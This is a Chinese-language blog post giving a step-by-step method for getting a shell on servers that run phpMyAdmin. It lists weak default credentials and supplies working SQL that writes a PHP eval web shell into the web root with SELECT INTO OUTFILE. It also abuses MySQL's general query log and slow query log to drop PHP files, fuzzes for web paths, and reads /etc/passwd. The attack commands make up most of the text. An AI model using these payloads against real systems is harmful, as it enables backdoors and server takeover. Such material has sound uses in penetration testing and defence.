---
title: "phpmyadmin-getshell姿势"
date: "2025-01-14"
description: "phpMyAdmin 是一个用 PHP 编写的开源工具，旨在通过 Web 界面管理 MySQL 和 MariaDB 数据库。"
---

#### [](#1-phpmyadmin "1. phpmyadmin")1\. phpmyadmin

phpMyAdmin 是一个用 PHP 编写的开源工具，旨在通过 Web 界面管理 MySQL 和 MariaDB 数据库。

#### [](#2-getshell "2. getshell")2\. getshell

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20250113162904.png)

#### [](#2-1-弱口令 "2.1 弱口令")2.1 弱口令

root:root  
root:(space)  
mysql:mysql

#### [](#2-2-写shell "2.2  写shell")2.2 写shell

(1) 当前的数据库用户有写权限  
(2) 知道web绝对路径  
(3) web路径能写 secrue\_file\_priv不被设置

###### [](#2-2-1-权限查看 "2.2.1 权限查看")2.2.1 权限查看

权限可以看看phpmyadmin的一些权限控制  
![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20250113172639.png)

###### [](#2-2-2变量查看 "2.2.2变量查看")2.2.2变量查看

```sql
show variables like '%secure%';
```

如果secure\_file\_priv没有任何设置,则我们可以写马但是如果设置了对应的文件，我们就无法写入  
![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20250113173133.png)

###### [](#2-2-3-网站路径 "2.2.3 网站路径")2.2.3 网站路径

1.  phpinfo

DOCUMENT\_ROOT

C:/phpStudy/WWW

2\. 报错信息

3\. 框架

4\. 爆破

利用数据库路径去爆破猜测

```sql
# 这是数据库的路径条件依照这个猜测网站根目录 show variables like '%datadir%'; 
```

利用sql语句去猜测爆破

```sql
针对路径进行fuzz select 'test' into outfile '/var/www/$fuzz$/shell.php';load data infile "/etc/passwd" into table test;加载文件内容进入到执行的数据库表 /*	不存在将会报错Can't create/write to file '/var/www/html/666.txt' (Errcode: 2)；	如果存在但是目录写不进去将返回(Errcode: 13)；没权限*/
```

###### [](#2-2-4-shell写入 "2.2.4 shell写入")2.2.4 shell写入

```sql
select '<?php echo 1;@eval($_POST[cmd]);?>' into outfile 'C:/phpStudy/WWW/shell.php';
```

#### [](#3-通用查询日志shell "3. 通用查询日志shell")3\. 通用查询日志shell

mysql可以设置通用日志文件，他跟直接利用`LOAD DATA INFILE` 和 `SELECT INTO OUTFILE`等写入操作的语句不同，它不受`secrue_file_priv`的影响。只要我们有权限并且知道绝对路径就可以。

```sql
set global general_log = "ON";show variables like 'general%';set global general_log_file = "C:/phpStudy/WWW/404.php";select "<?php phpinfo();@eval($_POST['cmd']);?>";#一次没成功就把这句再执行
```

相当于把mysql的日志功能给利用上了，将日志文件指定成php文件，再利用web的绝对路径然后进行解析.

#### [](#4-慢查询日志 "4. 慢查询日志")4\. 慢查询日志

```sql
set GLOBAL slow_query_log=on;show variables like '%slow%';set GLOBAL slow_query_log_file='C:/phpStudy/WWW/slow.php';select '<?php phpinfo();?>' from mysql.db where sleep(10);
```
